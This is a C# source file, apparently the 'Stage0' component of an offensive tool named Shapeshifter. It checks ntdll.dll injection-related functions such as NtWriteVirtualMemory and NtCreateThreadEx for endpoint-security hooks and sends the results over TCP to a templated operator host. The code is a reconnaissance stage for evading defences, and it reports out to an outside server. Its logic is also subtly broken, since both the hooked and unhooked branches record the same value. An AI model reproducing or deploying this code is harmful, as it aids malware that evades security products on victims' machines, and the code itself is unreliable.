using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Linq;
using System.Collections.Generic;
using System.Net.Sockets;

namespace Stage0
{
    class Program
    {
        public static string _host = "[SHAPESHIFTER_HOST]";
        public static string _port = "[SHAPESHIFTER_PORT]";

        static string[] functions =
        {
            "NtClose",
            "NtAllocateVirtualMemory",
            "NtAllocateVirtualMemoryEx",
            "NtCreateThread",
            "NtCreateThreadEx",
            "NtCreateUserProcess",
            "NtFreeVirtualMemory",
            "NtLoadDriver",
            "NtMapViewOfSection",
            "NtOpenProcess",
            "NtProtectVirtualMemory",
            "NtQueueApcThread",
            "NtQueueApcThreadEx",
            "NtResumeThread",
            "NtSetContextThread",
            "NtSetInformationProcess",
            "NtSuspendThread",
            "NtUnloadDriver",
            "NtWriteVirtualMemory"
        };
        static byte[] HookChecks = new byte[functions.Length];
        static byte[] safeBytes = {
            0x4c, 0x8b, 0xd1, // mov r10, rcx
            0xb8              // mov eax, ??
        };

        static void Main(string[] args)
        {
            // Get the base address of ntdll.dll in our own process
            IntPtr ntdllBase = GetNTDLLBase();
            if (ntdllBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Couldn't find ntdll.dll. Something is wrong...");
                return;

            }
            else { Console.WriteLine("NTDLL Base Address: 0x{0:X}", ntdllBase.ToInt64()); }

            // Get the address of each of the target functions in ntdll.dll
            IDictionary<string, IntPtr> funcAddresses = GetFuncAddress(ntdllBase, functions);

            // Check the first DWORD at each function's address for proper SYSCALL setup
            int i = 0; // Used for populating the results array
            bool safe;
            foreach (KeyValuePair<string, IntPtr> func in funcAddresses)
            {
                byte[] instructions = new byte[4];
                Marshal.Copy(func.Value, instructions, 0, 4);

                string fmtFunc = string.Format("    {0,-25} 0x{1:X} ", func.Key, func.Value.ToInt64());
                safe = instructions.SequenceEqual(safeBytes);

                if (safe)
                {
                    Console.WriteLine(fmtFunc + "- SAFE");
                    HookChecks[i] = 1;
                }
                else
                {
                    byte[] hookInstructions = new byte[32];
                    Marshal.Copy(func.Value, hookInstructions, 0, 32);
                    Console.WriteLine(fmtFunc + " - HOOK DETECTED");
                    Console.WriteLine("    {0,-25} {1}", "Instructions: ", BitConverter.ToString(hookInstructions).Replace("-", " "));
                    HookChecks[i] = 1;
                }

                i++;
            }

            SendData(_host, Convert.ToInt32(_port), HookChecks);
        }

        static void SendData(string server, int port, byte[] message)
        {
            try
            {
                // Create a TcpClient.
                // Note, for this client to work you need to have a TcpServer
                // connected to the same address as specified by the server, port
                // combination.
                TcpClient client = new TcpClient(server, port);


                // Get a client stream for reading and writing.
                NetworkStream stream = client.GetStream();


                // Send the message to the connected TcpServer.
                Console.WriteLine("Sending {0} bytes", message.Length);
                stream.Write(message, 0, message.Length);

                //// Receive the TcpServer.response.

                //// Buffer to store the response bytes.
                //data = new Byte[256];

                //// String to store the response ASCII representation.
                //String responseData = String.Empty;

                //// Read the first batch of the TcpServer response bytes.
                //Int32 bytes = stream.Read(data, 0, data.Length);
                //responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                //Console.WriteLine("Received: {0}", responseData);

                // Close everything.
                stream.Close();
                client.Close();
            }
            catch (ArgumentNullException e)
            {
                Console.WriteLine("ArgumentNullException: {0}", e);
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e.Message);
            }

        }

        static IntPtr GetNTDLLBase()
        {
            ProcessModule module = null;
            Process hProc = Process.GetCurrentProcess();
            module = hProc.Modules.Cast<ProcessModule>().SingleOrDefault(m => string.Equals(m.ModuleName, "ntdll.dll", StringComparison.OrdinalIgnoreCase));
            if (module.BaseAddress != null)
            {
                return module.BaseAddress;
            }
            else
            {
                return IntPtr.Zero;
            }
        }

        static IDictionary<string, IntPtr> GetFuncAddress(IntPtr hModule, string[] functions)
        {
            IDictionary<string, IntPtr> funcAddresses = new Dictionary<string, IntPtr>();
            foreach (string function in functions)
            {
                try
                {
                    funcAddresses.Add(function, Win32.GetProcAddress(hModule, function));
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Failed to locate ntdll!{0} (Error: {1})", function, ex.Message);
                }
            }

            return funcAddresses;
        }
    }

    class Win32
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    }
}
